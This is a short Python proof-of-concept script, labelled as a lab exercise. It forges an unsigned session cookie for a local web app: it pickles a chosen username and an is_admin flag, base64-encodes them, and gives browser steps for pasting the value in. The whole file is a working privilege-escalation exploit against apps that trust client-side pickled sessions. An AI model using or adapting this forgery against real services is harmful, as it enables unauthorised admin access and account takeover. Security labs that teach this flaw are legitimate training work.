import base64
import pickle
import argparse

def encode_session(obj: dict) -> str:
    raw = pickle.dumps(obj)
    return base64.urlsafe_b64encode(raw).decode("utf-8")

def main():
    parser = argparse.ArgumentParser(description="Lab PoC: forge insecure session cookie")
    parser.add_argument("--user", default="alice", help="username to embed in cookie")
    parser.add_argument("--admin", action="store_true", help="set is_admin=True")
    args = parser.parse_args()

    forged = {"user": args.user, "is_admin": bool(args.admin)}
    cookie_value = encode_session(forged)

    print("FORGED session cookie value:\n")
    print(cookie_value)
    print("\nUse it in your browser:")
    print("DevTools → Application → Cookies → http://127.0.0.1:5000 → session → paste value")

if __name__ == "__main__":
    main()
